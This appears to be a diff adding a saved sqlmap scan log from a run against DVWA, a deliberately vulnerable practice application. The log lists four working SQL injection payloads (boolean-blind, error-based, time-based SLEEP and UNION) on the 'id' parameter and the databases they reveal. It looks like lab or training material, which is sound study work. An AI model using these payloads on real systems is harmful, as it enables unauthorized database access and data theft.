@@ -1,0 +1,25 @@
+sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: id=1' AND 1732=(SELECT (CASE WHEN (1732=1732) THEN 1732 ELSE (SELECT 4347 UNION SELECT 6085) END))-- -&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=1' AND EXTRACTVALUE(9557,CONCAT(0x5c,0x7178717171,(SELECT (ELT(9557=9557,1))),0x716b627171)) AND 'YJxA'='YJxA&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 6065 FROM (SELECT(SLEEP(5)))AaZn) AND 'AmBX'='AmBX&Submit=Submit
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x7178717171,0x7757716e4145467465774d4a4949464b4c4e7768646b455874624d6e6d4c56546c49597449794570,0x716b627171)-- -&Submit=Submit
+---
+web application technology: Nginx 1.31.10
+back-end DBMS: MySQL >= 5.1 (MariaDB fork)
+available databases [2]:
+[*] dvwa
+[*] information_schema
+
